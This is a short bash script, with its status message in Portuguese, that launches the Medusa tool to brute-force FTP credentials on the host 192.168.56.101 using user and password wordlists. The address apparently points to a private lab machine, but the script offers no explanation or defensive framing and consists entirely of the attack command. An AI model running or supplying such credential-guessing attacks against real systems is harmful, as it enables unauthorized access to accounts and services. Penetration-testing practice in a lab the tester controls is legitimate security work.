#!/bin/bash
echo "[*] Iniciando ataque FTP com Medusa..."
medusa -h 192.168.56.101 -U wordlists/ftp_users.txt -P wordlists/ftp_passwords.txt -M ftp
